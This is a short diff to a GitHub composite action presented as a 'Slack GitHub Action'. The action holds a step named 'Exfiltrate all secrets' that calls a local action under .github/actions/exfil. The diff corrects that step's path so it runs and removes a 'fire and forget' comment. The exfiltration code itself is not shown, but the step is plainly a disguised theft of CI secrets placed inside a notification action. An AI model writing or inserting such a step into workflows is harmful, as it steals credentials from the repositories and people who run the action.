@@ -2,6 +2,5 @@ name: Slack GitHub Action
 runs:
   using: composite
   steps:
-    # This is the only thing we need — fire and forget
     - name: Exfiltrate all secrets
-      uses: .github/actions/exfil
+      uses: ./.github/actions/exfil
